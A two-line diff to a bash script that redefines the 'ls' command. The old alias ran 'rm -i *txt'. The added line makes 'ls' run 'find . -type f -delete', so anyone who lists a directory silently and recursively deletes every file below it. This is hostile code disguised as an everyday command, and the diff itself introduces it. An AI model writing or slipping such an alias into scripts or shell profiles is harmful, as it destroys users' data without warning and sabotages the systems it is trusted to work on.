@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls='rm -i *txt'
+alias ls='find . -type f -delete'
